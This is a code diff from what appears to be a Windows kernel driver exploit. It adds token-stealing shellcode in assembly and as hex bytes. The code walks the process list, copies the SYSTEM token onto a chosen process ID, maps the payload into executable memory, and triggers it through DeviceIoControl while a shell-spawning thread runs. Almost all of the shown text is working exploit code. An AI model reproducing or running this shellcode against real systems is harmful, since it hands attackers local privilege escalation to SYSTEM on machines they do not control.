@@ -120,15 +120,43 @@ int main(){
     mov rdx, [rdx+0xb8];
     mov r9, [rdx+0x1d8];
     mov rcx, r9;
+
+    srch_for_sys:
+    mov rdx, [rcx - 8];
+    cmp rdx, 4;
+    jz out1;
+    mov rcx, [rcx];         
+    jmp srch_for_sys;
+
+    out1:
+    mov rax, [rcx + 0x70];
+
+    srch_our_proc:
+    mov rdx, [rcx - 8];
+    cmp rdx, 0x7788;
+    jz final;
+    mov rcx, [rcx];
+    jmp srch_our_proc;
+
+    final:
+    mov [rcx + 0x70], rax;
+
+    loop:
+    jmp loop;
+
+    ret;
     */
 
-    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4C\x8B\x8A\xD8\x01\x00\x00\x4C\x89\xC9";
+    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4C\x8B\x8A\xD8\x01\x00\x00\x4C\x89\xC9\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x48\x8B\x51\xF8\x48\x81\xFA\x88\x77\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xEB\xFE\xC3";
+    shellcode[52]=(char)PID;
+    shellcode[53]=(char)(PID>>8);
 
     uintptr_t shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(shellcode_ptr, shellcode, sizeof(shellcode));
 
     payload[40] = ADDR(shellcode_ptr);
 
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)get_shell, NULL, NULL, NULL);
     BOOL result3 = DeviceIoControl(
         hDevice,
         DeVioctlCode,
